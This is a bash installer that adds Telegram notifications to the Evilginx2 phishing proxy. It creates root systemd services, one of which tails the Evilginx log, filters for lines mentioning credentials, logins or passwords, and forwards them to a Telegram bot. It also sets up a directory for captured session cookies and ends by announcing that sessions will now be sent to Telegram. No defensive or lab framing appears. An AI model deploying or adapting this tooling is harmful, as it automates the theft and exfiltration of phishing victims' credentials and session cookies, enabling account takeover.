#!/bin/bash

# Evilginx2 Telegram Integration Installer
# This script installs and configures Telegram notifications for Evilginx2

echo "🔴 Evilginx2 Telegram Integration Installer 🔴"
echo "================================================"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "Please run as root: sudo ./install-telegram.sh"
    exit 1
fi

# Install dependencies
echo "📦 Installing dependencies..."
apt update -y
apt install -y python3 python3-pip

# Install Python dependencies
echo "📦 Installing Python dependencies..."
pip3 install requests

# Create directories
echo "📁 Creating directories..."
mkdir -p /usr/local/bin/
mkdir -p /root/evilginx_sessions
mkdir -p /etc/systemd/system/

# Copy telegram notifier script
echo "📋 Installing telegram notifier..."
cp custom/telegram/telegram_notifier.py /usr/local/bin/telegram_notifier.py
chmod +x /usr/local/bin/telegram_notifier.py

# Create systemd service
echo "🔧 Creating systemd service..."
cat > /etc/systemd/system/telegram_notifier.service << 'EOF'
[Unit]
Description=Telegram Notifier for Evilginx2
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /usr/local/bin/telegram_notifier.py
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Create log monitor service
echo "🔧 Creating log monitor service..."
cat > /etc/systemd/system/evilginx_log_monitor.service << 'EOF'
[Unit]
Description=Evilginx Log Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'tail -f /root/.evilginx/evilginx.log | while read line; do if echo "$line" | grep -q "credentials\|login\|password"; then /usr/bin/python3 /usr/local/bin/telegram_notifier.py "🔴 **NEW SESSION**: $line"; fi; done'
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Set permissions
echo "🔒 Setting permissions..."
chmod 700 /root/evilginx_sessions
chmod 644 /usr/local/bin/telegram_notifier.py

# Create Evilginx log directory
mkdir -p /root/.evilginx
touch /root/.evilginx/evilginx.log
chmod 644 /root/.evilginx/evilginx.log

# Reload systemd and enable services
echo "🚀 Enabling services..."
systemctl daemon-reload
systemctl enable telegram_notifier
systemctl enable evilginx_log_monitor

# Start services
echo "▶️ Starting services..."
systemctl start telegram_notifier
systemctl start evilginx_log_monitor

# Check service status
echo "📊 Checking service status..."
echo "Telegram Notifier Service:"
systemctl is-active telegram_notifier
echo "Log Monitor Service:"
systemctl is-active evilginx_log_monitor

# Test the installation
echo "🧪 Testing installation..."
echo "Test message from @the_chiefs - Evilginx2 Telegram integration is working!" | /usr/bin/python3 /usr/local/bin/telegram_notifier.py

# Display configuration
echo ""
echo "✅ Installation completed!"
echo "================================================"
echo "📧 Your Telegram bot is now configured!"
echo ""
echo "📍 Configuration file: /usr/local/bin/telegram_notifier.py"
echo "🍪 Cookies directory: /root/evilginx_sessions/"
echo "📋 Log file: /root/.evilginx/evilginx.log"
echo ""
echo "🔧 To configure your bot token and chat ID:"
echo "   sudo nano /usr/local/bin/telegram_notifier.py"
echo ""
echo "🧪 To test manually:"
echo "   echo 'test message' | /usr/bin/python3 /usr/local/bin/telegram_notifier.py"
echo ""
echo "📊 To check service status:"
echo "   sudo systemctl status telegram_notifier"
echo "   sudo systemctl status evilginx_log_monitor"
echo ""
echo "🔄 To restart services:"
echo "   sudo systemctl restart telegram_notifier"
echo "   sudo systemctl restart evilginx_log_monitor"
echo ""
echo "📝 To view logs:"
echo "   sudo journalctl -u telegram_notifier -f"
echo "   sudo journalctl -u evilginx_log_monitor -f"
echo ""
echo "🎯 Your Evilginx2 sessions will now be sent to Telegram!"
echo "================================================"
